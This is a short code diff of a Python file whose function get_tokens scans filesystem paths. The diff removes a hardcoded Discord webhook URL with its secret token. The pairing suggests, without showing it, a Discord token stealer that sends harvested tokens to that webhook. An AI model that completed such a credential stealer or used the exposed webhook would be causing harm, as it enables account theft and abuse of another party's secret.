@@ -1,8 +1,6 @@
 import os
 import re
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1129209643474882570/kg3kosSWvwrYGs5qMXuGno59lch3-4r8KU5boapbfEeqWWN_Xoepb4UZMaKn7Swb6Vft'
-
 def get_tokens(path):
     tokens = []
     print(f"Checking path: {path}")
